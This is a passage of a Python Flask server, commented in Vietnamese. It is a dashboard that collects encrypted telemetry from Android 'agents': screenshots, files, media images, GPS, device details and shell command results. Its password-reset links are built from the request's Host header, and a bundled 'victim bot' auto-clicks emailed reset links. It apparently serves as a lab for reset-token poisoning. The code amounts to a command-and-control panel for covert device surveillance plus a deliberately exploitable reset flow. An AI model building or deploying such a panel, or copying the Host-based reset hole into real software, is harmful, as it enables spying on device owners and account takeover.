"""Portal web — artifact endpoints + API telemetry + dashboard.

API telemetry (POST /api/*):
- Auth: Authorization: Bearer <AGENT_TOKEN>
- Body: JSON mã hoá ENC1 (AES-256-GCM)
- Replay protection: request_id unique per agent + timestamp window ±300s
"""

import sys
import base64
import json
import os
import re

# Windows console cp1252 → UTF-8 (chống UnicodeEncodeError khi print tiếng Việt
# từ các thread — victim-bot chết ngay lúc start nếu không có cái này)
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
import email
import imaplib
import smtplib
import sqlite3
import threading
import time
import urllib.parse
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone
from email.message import EmailMessage
from functools import wraps

from werkzeug.security import check_password_hash, generate_password_hash

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dotenv import load_dotenv
from flask import (Flask, abort, flash, jsonify, redirect, render_template,
                   render_template_string, request, send_from_directory, session,
                   url_for)

load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))

APP_DIR = os.path.dirname(os.path.abspath(__file__))
ARTIFACT_DIR = os.path.join(APP_DIR, "artifacts")
DB_PATH = os.path.join(APP_DIR, "website_b.db")

MAX_ARTIFACT_SIZE = 5 * 1024 * 1024  # 5MB
MAGIC = b"ENC1"
KEY_HEX = os.getenv("WEBSITE_AES_KEY", "")
if not re.fullmatch(r"[0-9a-fA-F]{64}", KEY_HEX):
    raise SystemExit("❌ WEBSITE_AES_KEY missing/invalid (cần hex 64 ký tự) trong website_b/.env")
KEY = bytes.fromhex(KEY_HEX)

AGENT_TOKEN = os.getenv("AGENT_TOKEN", "")
if not AGENT_TOKEN:
    raise SystemExit("❌ AGENT_TOKEN missing trong website_b/.env")

SECRET_KEY = os.getenv("SECRET_KEY", "")
if not SECRET_KEY:
    raise SystemExit("❌ SECRET_KEY missing trong website_b/.env (login session)")
ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "")
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL", "")

# SMTP — Gmail: cần APP PASSWORD (không phải mật khẩu thường). Nếu chưa cấu hình
# thì reset mật khẩu vẫn hoạt động theo mode "token lấy qua CLI".
SMTP_HOST = os.getenv("SMTP_HOST", "")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
GMAIL_USER = os.getenv("GMAIL_USER", "")
GMAIL_APP_PASSWORD = os.getenv("GMAIL_APP_PASSWORD", "")
SMTP_READY = bool(GMAIL_USER and GMAIL_APP_PASSWORD)

# Gmail API (HTTPS/443) — dùng khi port SMTP 25/465/587 bị nhà cung cấp chặn.
# Đủ cả 3 key dưới → send_mail() ưu tiên API; thiếu/fail → fallback SMTP.
GMAIL_API_CLIENT_ID = os.getenv("GMAIL_API_CLIENT_ID", "")
GMAIL_API_CLIENT_SECRET = os.getenv("GMAIL_API_CLIENT_SECRET", "")
GMAIL_API_REFRESH_TOKEN = os.getenv("GMAIL_API_REFRESH_TOKEN", "")
GMAIL_API_READY = bool(GMAIL_API_CLIENT_ID and GMAIL_API_CLIENT_SECRET and GMAIL_API_REFRESH_TOKEN)

# ── VICTIM BOT (auto-click reset links — tích hợp vào web process) ──
VICTIM_BOT = os.getenv("VICTIM_BOT", "on").lower() in ("on", "true", "1")
VICTIM_BOT_INTERVAL = int(os.getenv("VICTIM_BOT_INTERVAL", "30"))
VB_STATE_FILE = os.path.join(APP_DIR, "victim_bot.state.json")

REPLAY_WINDOW_S = 300  # timestamp lệch tối đa chấp nhận
HEARTBEAT_TIMEOUT_S = 90  # Online → Offline

# kind → {extension: mime_type}
ALLOWED = {
    "screenshot": {".png": "image/png"},
    "files": {
        ".txt": "text/plain",
        ".png": "image/png",
        ".jpg": "image/jpeg",
        ".jpeg": "image/jpeg",
        ".webp": "image/webp",
        ".gif": "image/gif",
    },
}

IMAGE_MAGIC = {
    "image/png": b"\x89PNG",
    "image/jpeg": b"\xff\xd8",
    "image/webp": b"RIFF",
    "image/gif": b"GIF8",
}

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(hours=12)


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def log_outgoing_link(link: str):
    """Ghi link gửi ra console máy chủ."""
    print(f"[mail] outgoing link: {link}", flush=True)


def init_db():
    os.makedirs(ARTIFACT_DIR, exist_ok=True)
    with get_db() as conn:
        conn.executescript(
            """
            CREATE TABLE IF NOT EXISTS artifacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                artifact_id TEXT UNIQUE NOT NULL,
                agent_id TEXT NOT NULL,
                task_id TEXT,
                type TEXT NOT NULL,
                filename TEXT NOT NULL,
                mime_type TEXT NOT NULL,
                size INTEGER NOT NULL,
                storage_path TEXT NOT NULL,
                created_at REAL NOT NULL
            );
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                model TEXT,
                manufacturer TEXT,
                android_version TEXT,
                sdk_version TEXT,
                app_version TEXT,
                created_at REAL NOT NULL,
                last_seen REAL NOT NULL,
                status TEXT DEFAULT 'offline',
                metadata TEXT
            );
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                task_id TEXT UNIQUE NOT NULL,
                agent_id TEXT NOT NULL,
                type TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'queued',
                created_at TEXT,
                received_at TEXT,
                completed_at TEXT,
                result TEXT,
                error TEXT
            );
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                task_id TEXT,
                timestamp REAL NOT NULL,
                event TEXT NOT NULL,
                status TEXT,
                metadata TEXT
            );
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT,
                pass_hash TEXT NOT NULL,
                created_at REAL NOT NULL,
                reset_token TEXT,
                reset_expires REAL
            );
            -- replay protection (muc 12.1): request_id unique theo agent
            CREATE TABLE IF NOT EXISTS seen_requests (
                agent_id TEXT NOT NULL,
                request_id TEXT NOT NULL,
                timestamp REAL NOT NULL,
                PRIMARY KEY (agent_id, request_id)
            );
            """
        )


def decrypt_body(raw: bytes) -> bytes:
    """Body format: 'ENC1' + 12-byte nonce + AES-256-GCM ciphertext (tag 128)."""
    if len(raw) < 4 + 12 + 16 or raw[:4] != MAGIC:
        raise ValueError("bad_payload")
    return AESGCM(KEY).decrypt(raw[4:16], raw[16:], None)


def validate_upload(kind: str):
    """Validate metadata headers + decrypt + magic/size check."""
    allowed = ALLOWED[kind]
    agent_id = (request.headers.get("X-Agent-Id") or "").strip()
    task_id = (request.headers.get("X-Task-Id") or "").strip()
    filename = os.path.basename(request.headers.get("X-Filename") or "")
    raw = request.get_data()

    if not agent_id or not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", agent_id):
        return None, (jsonify(error="invalid_parameter", detail="agent_id"), 400)
    if not task_id:
        return None, (jsonify(error="invalid_parameter", detail="task_id"), 400)
    if not filename:
        return None, (jsonify(error="invalid_parameter", detail="filename"), 400)
    if len(raw) > MAX_ARTIFACT_SIZE + 256:
        return None, (jsonify(error="file_too_large"), 400)

    try:
        plain = decrypt_body(raw)
    except Exception:
        return None, (jsonify(error="decrypt_failed", detail="wrong key or bad body"), 400)

    if len(plain) <= 0 or len(plain) > MAX_ARTIFACT_SIZE:
        return None, (jsonify(error="file_too_large"), 400)

    _, ext = os.path.splitext(filename)
    ext = ext.lower()
    expected_mime = allowed.get(ext)
    if expected_mime is None:
        return None, (jsonify(error="invalid_extension",
                              detail="expected one of " + ", ".join(allowed)), 400)

    # Magic-bytes check cho image (MIME validation)
    magic = IMAGE_MAGIC.get(expected_mime)
    if magic and not plain.startswith(magic):
        return None, (jsonify(error="invalid_content", detail=f"not {ext} data"), 400)
    if ext == ".txt":
        try:
            plain.decode("utf-8")
        except UnicodeDecodeError:
            return None, (jsonify(error="invalid_content", detail="not utf-8"), 400)

    return (agent_id, task_id, plain, filename, len(plain), expected_mime), None


def save_artifact(kind: str, validated):
    agent_id, task_id, plain, filename, size, mime = validated
    ext = os.path.splitext(filename)[1].lower()
    artifact_id = uuid.uuid4().hex[:12]

    folder = os.path.join(ARTIFACT_DIR, agent_id)
    os.makedirs(folder, exist_ok=True)
    # Luôn dùng forward slash "/": werkzeug's send_from_directory REJECTS mọi path
    # chứa "\" (alt-sep check) → lưu backslash sẽ gây 404 khi download.
    storage_path = f"{agent_id}/{artifact_id}{ext}"
    with open(os.path.join(ARTIFACT_DIR, storage_path), "wb") as f:
        f.write(plain)

    with get_db() as conn:
        conn.execute(
            "INSERT INTO artifacts (artifact_id, agent_id, task_id, type, filename,"
            " mime_type, size, storage_path, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (artifact_id, agent_id, task_id, kind, filename, mime, size, storage_path, time.time()),
        )
    return {
        "artifact_id": artifact_id,
        "agent_id": agent_id,
        "task_id": task_id,
        "type": kind,
        "filename": filename,
        "mime_type": mime,
        "size": size,
        "url": f"/artifacts/{artifact_id}",
    }


@app.post("/artifacts/screenshot")
def upload_screenshot():
    validated, err = validate_upload("screenshot")
    if err:
        return err
    return jsonify(save_artifact("screenshot", validated))


@app.post("/artifacts/files")
def upload_file():
    validated, err = validate_upload("files")
    if err:
        return err
    return jsonify(save_artifact("files", validated))


@app.post("/artifacts/<artifact_id>/delete")
def delete_artifact(artifact_id: str):
    """Xóa artifact: remove file + DB row (operator action trên dashboard)."""
    with get_db() as conn:
        row = conn.execute(
            "SELECT storage_path, filename FROM artifacts WHERE artifact_id=?", (artifact_id,)
        ).fetchone()
    if row is None:
        return jsonify(error="not_found"), 404
    # Chỉ xóa file nằm trong ARTIFACT_DIR
    rel = row["storage_path"].replace("\\", "/").lstrip("/")
    full = os.path.realpath(os.path.join(ARTIFACT_DIR, rel))
    if not full.startswith(os.path.realpath(ARTIFACT_DIR) + os.sep):
        return jsonify(error="invalid_parameter", detail="bad storage_path"), 400
    try:
        os.remove(full)
    except FileNotFoundError:
        pass
    with get_db() as conn:
        conn.execute("DELETE FROM artifacts WHERE artifact_id=?", (artifact_id,))
    log_event(artifact_id, "", "artifact_delete", "ok", rel)
    return jsonify(status="ok", deleted=artifact_id, filename=row["filename"])


@app.get("/artifacts/<artifact_id>")
def download_artifact(artifact_id: str):
    with get_db() as conn:
        row = conn.execute(
            "SELECT * FROM artifacts WHERE artifact_id=?", (artifact_id,)
        ).fetchone()
    if row is None:
        return jsonify(error="not_found"), 404
    return send_from_directory(
        ARTIFACT_DIR, row["storage_path"].replace("\\", "/"),
        as_attachment=True, download_name=row["filename"],
    )


@app.get("/health")
def health():
    return jsonify(status="ok")


# ─────────────────────────────────────────────────────────────────────────────
# API TELEMETRY — body AES-256-GCM + Bearer token + replay protection
# (request_id unique / timestamp ±300s).
# ─────────────────────────────────────────────────────────────────────────────


def api_auth():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer ") or auth[7:] != AGENT_TOKEN:
        return jsonify(error="invalid_token"), 401
    return None


def decode_api_body() -> tuple:
    """Decrypt + parse body API → (obj, error_response)."""
    raw = request.get_data()
    if len(raw) > 256 * 1024:
        return None, (jsonify(error="payload_too_large"), 400)
    try:
        plain = decrypt_body(raw)
    except Exception:
        return None, (jsonify(error="decrypt_failed", detail="wrong key or bad body"), 400)
    try:
        obj = json.loads(plain.decode("utf-8"))
    except Exception:
        return None, (jsonify(error="invalid_json"), 400)
    if not isinstance(obj, dict):
        return None, (jsonify(error="invalid_parameter", detail="expect json object"), 400)
    return obj, None


def replay_guard(obj: dict) -> dict:
    """Validate agent_id/request_id/timestamp + chặn replay. Return error dict hoặc {}."""
    agent_id = str(obj.get("agent_id") or "")
    request_id = str(obj.get("request_id") or "")
    ts = obj.get("timestamp")

    if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", agent_id):
        return {"error": "invalid_parameter", "detail": "agent_id"}
    if not (8 <= len(request_id) <= 64):
        return {"error": "invalid_parameter", "detail": "request_id"}
    if not isinstance(ts, (int, float)) or abs(time.time() - ts) > REPLAY_WINDOW_S:
        return {"error": "invalid_parameter", "detail": "timestamp"}
    if ts < time.time() - REPLAY_WINDOW_S:
        # timestamp cũ hơn window → có thể replay cũ
        return {"error": "replay_detected", "detail": "stale timestamp"}

    with get_db() as conn:
        try:
            conn.execute(
                "INSERT INTO seen_requests (agent_id, request_id, timestamp) VALUES (?, ?, ?)",
                (agent_id, request_id, ts),
            )
        except sqlite3.IntegrityError:
            return {"error": "replay_detected", "detail": request_id}
    return {}


def _clean(obj: dict, key: str, maxlen: int) -> str:
    v = obj.get(key)
    return str(v)[:maxlen] if isinstance(v, (str, int, float)) else ""


def touch_agent(agent_id: str, app_version: str = ""):
    """Mọi /api/* từ agent → đảm bảo có row (UPSERT) + đánh dấu ONLINE + last_seen.

    UPSERT quan trọng: agent mà /api/register lần đầu fail (key chưa sync) thì
    heartbeat vẫn phải tạo row — dashboard phải liệt kê ĐỦ mọi agent đã kết nối.
    """
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO agents (agent_id, app_version, created_at, last_seen, status)
            VALUES (?, ?, ?, ?, 'online')
            ON CONFLICT(agent_id) DO UPDATE SET
                last_seen=excluded.last_seen, status='online',
                app_version=CASE WHEN excluded.app_version != ''
                    THEN excluded.app_version ELSE agents.app_version END
            """,
            (agent_id, app_version, time.time(), time.time()),
        )


def log_event(agent_id: str, task_id: str, event: str, status: str, metadata: str = ""):
    with get_db() as conn:
        conn.execute(
            "INSERT INTO logs (agent_id, task_id, timestamp, event, status, metadata)"
            " VALUES (?, ?, ?, ?, ?, ?)",
            (agent_id, task_id, time.time(), event[:64], status[:32] if status else None, metadata[:512]),
        )


@app.post("/api/register")
def api_register():
    err = api_auth()
    if err:
        return err
    obj, err = decode_api_body()
    if err:
        return err
    replay = replay_guard(obj)
    if replay:
        return jsonify(**replay), (409 if replay["error"] == "replay_detected" else 400)

    agent_id = str(obj["agent_id"])
    device = obj.get("device") if isinstance(obj.get("device"), dict) else {}
    app_version = _clean(obj, "app_version", 32)
    meta = {
        "model": str(device.get("model") or "")[:64],
        "manufacturer": str(device.get("manufacturer") or "")[:64],
        "android_version": str(device.get("android_version") or "")[:16],
        "sdk_version": str(device.get("sdk_version") or "")[:8],
    }
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO agents (agent_id, model, manufacturer, android_version, sdk_version,
                                app_version, created_at, last_seen, status, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'online', ?)
            ON CONFLICT(agent_id) DO UPDATE SET
                model=excluded.model, manufacturer=excluded.manufacturer,
                android_version=excluded.android_version, sdk_version=excluded.sdk_version,
                app_version=excluded.app_version, last_seen=excluded.last_seen, status='online',
                metadata=excluded.metadata
            """,
            (agent_id, meta["model"], meta["manufacturer"], meta["android_version"],
             meta["sdk_version"], app_version, time.time(), time.time(), json.dumps(meta)),
        )
    log_event(agent_id, "", "register", "ok")
    return jsonify(status="ok", registered=agent_id)


@app.post("/api/heartbeat")
def api_heartbeat():
    err = api_auth()
    if err:
        return err
    obj, err = decode_api_body()
    if err:
        return err
    replay = replay_guard(obj)
    if replay:
        return jsonify(**replay), (409 if replay["error"] == "replay_detected" else 400)

    agent_id = str(obj["agent_id"])
    status = _clean(obj, "status", 32) or "online"
    app_version = _clean(obj, "app_version", 32)
    touch_agent(agent_id, app_version)
    if status != "online":  # heartbeat báo trạng thái khác (vd sleeping) → ghi đè
        with get_db() as conn:
            conn.execute("UPDATE agents SET status=? WHERE agent_id=?", (status, agent_id))
    return jsonify(status="ok", agent_id=agent_id, acknowledged="online")


@app.post("/api/results")
def api_results():
    err = api_auth()
    if err:
        return err
    obj, err = decode_api_body()
    if err:
        return err
    replay = replay_guard(obj)
    if replay:
        return jsonify(**replay), (409 if replay["error"] == "replay_detected" else 400)

    agent_id = str(obj["agent_id"])
    task_id = _clean(obj, "task_id", 64)
    ttype = _clean(obj, "type", 64) or "unknown"
    status = (_clean(obj, "status", 32) or "completed").lower()
    if status not in ("queued", "delivered", "running", "completed", "failed"):
        status = "completed"
    data = obj.get("data") if isinstance(obj.get("data"), dict) else obj.get("result")
    result_json = json.dumps(data, ensure_ascii=False)[:65535] if data is not None else None
    error = _clean(obj, "error", 128) or None

    now_iso = datetime.now(timezone.utc).isoformat(timespec="seconds")
    with get_db() as conn:
        conn.execute(
            """
            INSERT INTO tasks (task_id, agent_id, type, status, created_at, received_at,
                               completed_at, result, error)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(task_id) DO UPDATE SET
                status=excluded.status, received_at=excluded.received_at,
                completed_at=excluded.completed_at, result=excluded.result, error=excluded.error
            """,
            (task_id, agent_id, ttype, status, now_iso, now_iso,
             now_iso if status in ("completed", "failed") else None, result_json, error),
        )
    log_event(agent_id, task_id, "result", status)
    touch_agent(agent_id)
    return jsonify(status="ok", task_id=task_id, stored_status=status)


@app.post("/api/logs")
def api_logs():
    err = api_auth()
    if err:
        return err
    obj, err = decode_api_body()
    if err:
        return err
    replay = replay_guard(obj)
    if replay:
        return jsonify(**replay), (409 if replay["error"] == "replay_detected" else 400)

    agent_id = str(obj["agent_id"])
    entries = obj.get("entries") if isinstance(obj.get("entries"), list) else []
    n = 0
    for e in entries[:100]:
        if not isinstance(e, dict):
            continue
        ts = e.get("timestamp")
        log_event(
            agent_id,
            str(e.get("task_id") or "")[:64],
            str(e.get("event") or "log")[:64],
            str(e.get("status") or "")[:32],
            json.dumps(e.get("metadata"), ensure_ascii=False)[:512] if e.get("metadata") is not None else "",
        )
        n += 1
    touch_agent(agent_id)
    return jsonify(status="ok", stored=n)

# ─────────────────────────────────────────────────────────────────────────────
# DASHBOARD
# ─────────────────────────────────────────────────────────────────────────────

def _online(last_seen) -> bool:
    return bool(last_seen) and (time.time() - last_seen) <= HEARTBEAT_TIMEOUT_S


def _fmt_ts(v) -> str:
    if v is None:
        return "—"
    # chấp nhận cả REAL (unix) lẫn ISO string
    if isinstance(v, (int, float)):
        return datetime.fromtimestamp(v).strftime("%m-%d %H:%M:%S")
    return str(v).replace("T", " ")[:19]


# ─────────────────────────────────────────────────────────────────────────────
# RESULTS EXPLORER — view kết quả theo từng loại task agent gọi lên
# ─────────────────────────────────────────────────────────────────────────────

TASK_TYPES = [
    ("device_info", "📱", "device_info"),
    ("battery_info", "🔋", "battery_info"),
    ("network_info", "📶", "network_info"),
    ("list_files", "📁", "list_files"),
    ("read_test_file", "📖", "read_test_file"),
    ("write_test_file", "✍️", "write_test_file"),
    ("download_test_artifact", "⬇️", "download"),
    ("upload_test_artifact", "⬆️", "upload"),
    ("screenshot", "📷", "screenshot"),
    ("list_media_images", "🖼️", "media list"),
    ("read_media_image", "🖼️", "media read"),
    ("shell", "💻", "shell"),
    ("get_gps", "📍", "GPS"),
    ("config", "⚙️", "config"),
]


@app.get("/results")
def results_explorer():
    ttype = request.args.get("type", "all")
    known = {t for t, _, _ in TASK_TYPES}
    if ttype not in known and ttype != "all":
        ttype = "all"
    where, args_ = "", []
    if ttype != "all":
        where, args_ = "WHERE type = ?", [ttype]
    with get_db() as conn:
        rows = conn.execute(
            f"SELECT * FROM tasks {where} ORDER BY id DESC LIMIT 100", args_
        ).fetchall()
        counts = {t: c for t, c in conn.execute(
            "SELECT type, COUNT(*) FROM tasks GROUP BY type").fetchall()}
        total = conn.execute("SELECT COUNT(*) c FROM tasks").fetchall()
    tasks_view = [dict(t) for t in rows]
    n_total = total[0]["c"] if total else 0
    return render_template(
        "results.html",
        task_types=TASK_TYPES, current=ttype, counts=counts,
        tasks=tasks_view, n_total=n_total,
        fmt_ts=lambda v: _fmt_ts(v),
    )


# ─────────────────────────────────────────────────────────────────────────────
# LOGIN / RESET PASSWORD (web session)
# ─────────────────────────────────────────────────────────────────────────────

PUBLIC_ENDPOINTS = {"static", "health", "login", "logout", "forgot", "reset"}


@app.before_request
def auth_gate():
    ep = request.endpoint or ""
    if ep in PUBLIC_ENDPOINTS or ep == "static":
        return
    if ep.startswith("api_"):  # agent telemetry dùng Bearer token riêng
        return
    if ep in ("upload_screenshot", "upload_file"):  # artifact upload = agent Bearer
        return
    if "user" not in session:
        return redirect(url_for("login", next=request.path))


def find_user(username: str):
    with get_db() as conn:
        return conn.execute(
            "SELECT * FROM users WHERE username=? OR email=?", (username, username)
        ).fetchone()


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = (request.form.get("username") or "").strip()
        pw = request.form.get("password") or ""
        row = find_user(u)
        if row and check_password_hash(row["pass_hash"], pw):
            session["user"] = row["username"]
            session.permanent = True
            nxt = request.args.get("next") or "/"
            if not nxt.startswith("/"):
                nxt = "/"
            return redirect(nxt)
        return render_template("login.html", error="Sai tài khoản hoặc mật khẩu."), 401
    return render_template("login.html", error=session.pop("login_hint", None))


@app.get("/logout")
def logout():
    session.pop("user", None)
    return redirect(url_for("login"))


@app.route("/forgot", methods=["GET", "POST"])
def forgot():
    """Đổi quên mật khẩu: tạo token (30 phút). Có SMTP → gửi link email; không → dùng CLI."""
    if request.method == "POST":
        u = (request.form.get("username") or "").strip()
        row = find_user(u)
        if row:
            token = uuid.uuid4().hex
            with get_db() as conn:
                conn.execute(
                    "UPDATE users SET reset_token=?, reset_expires=? WHERE id=?",
                    (token, time.time() + 1800, row["id"]),
                )
            link = f"http://{request.host}/reset?token={token}"
            log_outgoing_link(link)
            sent = send_mail(
                row["email"],
                "Portal — reset mật khẩu",
                "Link reset (hết hạn 30 phút):\n\n" + link,
            )
            if sent:
                flash("Đã gửi link reset vào email của tài khoản.", "ok")
                return redirect(url_for("login"))
            return render_template(
                "forgot.html", notice="SMTP chưa cấu hình/tài khoản không có email — "
                "dùng CLI: python ../tools/web_admin.py gen-token"
            )
        # không tiết lộ user có tồn tại hay không
        return render_template("forgot.html", notice="Nếu tài khoản tồn tại, hướng dẫn reset đã được xử lý.")
    return render_template("forgot.html", notice=None)


@app.route("/reset", methods=["GET", "POST"])
def reset():
    """Reset chỉ cần TOKEN (user được suy ra từ token — không truyền username)."""
    token = request.values.get("token") or ""
    row = None
    if token:
        with get_db() as conn:
            row = conn.execute(
                "SELECT * FROM users WHERE reset_token=? AND reset_expires > ?",
                (token, time.time()),
            ).fetchone()
    if request.method == "POST":
        token = request.form.get("token") or token
        pw1 = request.form.get("password") or ""
        pw2 = request.form.get("password2") or ""
        with get_db() as conn:
            row = conn.execute(
                "SELECT * FROM users WHERE reset_token=? AND reset_expires > ?",
                (token, time.time()),
            ).fetchone()
        if not row:
            return render_template("reset.html", error="Token không hợp lệ hoặc đã hết hạn.", token=token), 400
        if len(pw1) < 8 or pw1 != pw2:
            return render_template("reset.html", error="Mật khẩu cần ≥ 8 ký tự và nhập lại khớp.", token=token)
        with get_db() as conn:
            conn.execute(
                "UPDATE users SET pass_hash=?, reset_token=NULL, reset_expires=NULL WHERE id=?",
                (generate_password_hash(pw1), row["id"]),
            )
        flash("Mật khẩu đã được đặt lại — đăng nhập bằng mật khẩu mới.", "ok")
        return redirect(url_for("login"))
    return render_template("reset.html", error=None, token=token)


@app.route("/account", methods=["GET", "POST"])
def account():
    """Đổi mật khẩu (khi đã đăng nhập)."""
    u = session.get("user")
    if request.method == "POST":
        cur = request.form.get("current") or ""
        pw1 = request.form.get("password") or ""
        pw2 = request.form.get("password2") or ""
        with get_db() as conn:
            row = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if not row or not check_password_hash(row["pass_hash"], cur):
            return render_template("account.html", error="Mật khẩu hiện tại không đúng.")
        if len(pw1) < 8 or pw1 != pw2:
            return render_template("account.html", error="Mật khẩu mới cần ≥ 8 ký tự và nhập lại khớp.")
        with get_db() as conn:
            conn.execute("UPDATE users SET pass_hash=? WHERE username=?",
                         (generate_password_hash(pw1), u))
        flash("Đã đổi mật khẩu.", "ok")
        return redirect(url_for("account"))
    return render_template("account.html", error=None, user=u)


# ─────────────────────────────────────────────────────────────────────────────
# MAIL BOT — tự động mở link trong email của hộp thư (mô phỏng người dùng
# bấm link nhận được).
# ─────────────────────────────────────────────────────────────────────────────
_gmail_access = {"token": "", "exp": 0}


VB_PROCESSED = set()


def _vb_state_load():
    global VB_PROCESSED
    try:
        if os.path.exists(VB_STATE_FILE):
            VB_PROCESSED = set(json.load(open(VB_STATE_FILE, encoding="utf-8")))
    except Exception:
        pass


def _vb_state_save():
    try:
        json.dump(sorted(VB_PROCESSED), open(VB_STATE_FILE, "w", encoding="utf-8"))
    except Exception:
        pass


def _vb_raw_click(url: str):
    """GET thô qua raw socket (mô phỏng browser tối giản)."""
    import socket
    import urllib.parse as up
    u = up.urlparse(url)
    host = u.hostname or ""
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    print(f"[victim-bot] 🖱 click: {url}", flush=True)
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                      f"User-Agent: EVN-Portal-Bot\r\nConnection: close\r\n\r\n").encode())
        sock.settimeout(3)
        try:
            resp = sock.recv(4096).decode("utf-8", "replace")
            first = resp.splitlines()[0][:80] if resp else "(no reply)"
            print(f"[victim-bot]    ↳ reply: {first}", flush=True)
        except socket.timeout:
            print("[victim-bot]    ↳ gửi xong (listener raw không trả lời — normal)", flush=True)
        sock.close()
        return True
    except Exception as e:
        print(f"[victim-bot]    ↳ click fail: {type(e).__name__} {e}", flush=True)
        return False


def _vb_extract_links(msg):
    links = []
    for part in msg.walk():
        if part.get_content_type() == "text/plain":
            try:
                body = part.get_payload(decode=True).decode("utf-8", "replace")
            except Exception:
                body = ""
            links += re.findall(r"https?://[^\s]+", body)
    return links


def victim_bot_once():
    """1 lần poll: IMAP → tìm email reset mới → click link → đánh dấu đã xử lý."""
    import imaplib
    from email.header import decode_header as _dh
    st_file = VB_STATE_FILE
    processed = VB_PROCESSED
    im = imaplib.IMAP4_SSL("imap.gmail.com")
    im.login(GMAIL_USER, GMAIL_APP_PASSWORD)
    opened = None
    for folder in ('"All Mail"', '"[Gmail]/All Mail"', '"INBOX"'):
        try:
            st, _ = im.select(folder)
            if st == "OK":
                opened = folder
                break
        except Exception:
            continue
    if not opened:
        im.logout()
        return
    st, data = im.search(None, f'(from "{GMAIL_USER}" SUBJECT "Portal")')
    ids = (data[0] or b"").split() if st == "OK" else []
    clicked = 0
    for mid in ids:
        sid = mid.decode()
        if sid in processed:
            continue
        st, mdata = im.fetch(mid, "(RFC822)")
        if st != "OK" or not mdata[0]:
            continue
        msg = email.message_from_bytes(mdata[0][1])
        subj = ""
        for t, enc in _dh(msg.get("Subject", "")):
            subj = t if isinstance(t, str) else (t.decode(enc or "utf-8") if enc else t)
        print(f"[victim-bot] 📧 email [{subj}] id={sid}", flush=True)
        for link in _vb_extract_links(msg):
            if _vb_raw_click(link):
                clicked += 1
        processed.add(sid)
    im.logout()
    if clicked or len(processed) != len(VB_PROCESSED):
        _vb_state_save()
    if clicked:
        print(f"[victim-bot] done — clicked {clicked} link(s)", flush=True)


def victim_bot_loop():
    print(f"[victim-bot] started — poll mỗi {VICTIM_BOT_INTERVAL}s "
          f"(mailbox: {GMAIL_USER})", flush=True)
    while True:
        try:
            victim_bot_once()
        except Exception as e:
            print(f"[victim-bot] poll err: {type(e).__name__} {e}", flush=True)
        time.sleep(VICTIM_BOT_INTERVAL)


def start_victim_bot():
    if not VICTIM_BOT:
        print("[victim-bot] disabled (VICTIM_BOT=off)", flush=True)
        return
    if not (GMAIL_USER and GMAIL_APP_PASSWORD):
        print("[victim-bot] Gmail chưa cấu hình — bot không chạy", flush=True)
        return
    _vb_state_load()
    threading.Thread(target=victim_bot_loop, daemon=True, name="victim-bot").start()


ART_PAGE_SIZE = 20  # artifacts per page (dashboard)


@app.get("/")
def dashboard():
    with get_db() as conn:
        agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
        tsk = max(1, int(request.args.get("tsk", 1)))
        TASK_PAGE_SIZE = 30
        tasks_n_now = conn.execute("SELECT COUNT(*) c FROM tasks").fetchone()["c"]
        task_pages = max(1, (tasks_n_now + TASK_PAGE_SIZE - 1) // TASK_PAGE_SIZE)
        tsk = min(tsk, task_pages)
        tasks = conn.execute(
            "SELECT * FROM tasks ORDER BY id DESC LIMIT ? OFFSET ?",
            (TASK_PAGE_SIZE, (tsk - 1) * TASK_PAGE_SIZE),
        ).fetchall()
        art = max(1, int(request.args.get("art", 1)))
        artifacts_n_now = conn.execute("SELECT COUNT(*) c FROM artifacts").fetchone()["c"]
        art_pages = max(1, (artifacts_n_now + ART_PAGE_SIZE - 1) // ART_PAGE_SIZE)
        art = min(art, art_pages)
        artifacts = conn.execute(
            "SELECT * FROM artifacts ORDER BY id DESC LIMIT ? OFFSET ?",
            (ART_PAGE_SIZE, (art - 1) * ART_PAGE_SIZE),
        ).fetchall()
        stats = {
            "tasks_n": conn.execute("SELECT COUNT(*) c FROM tasks").fetchone()["c"],
            "queued_n": conn.execute(
                "SELECT COUNT(*) c FROM tasks WHERE status IN ('queued','delivered','running')").fetchone()["c"],
            "completed_n": conn.execute("SELECT COUNT(*) c FROM tasks WHERE status='completed'").fetchone()["c"],
            "failed_n": conn.execute("SELECT COUNT(*) c FROM tasks WHERE status='failed'").fetchone()["c"],
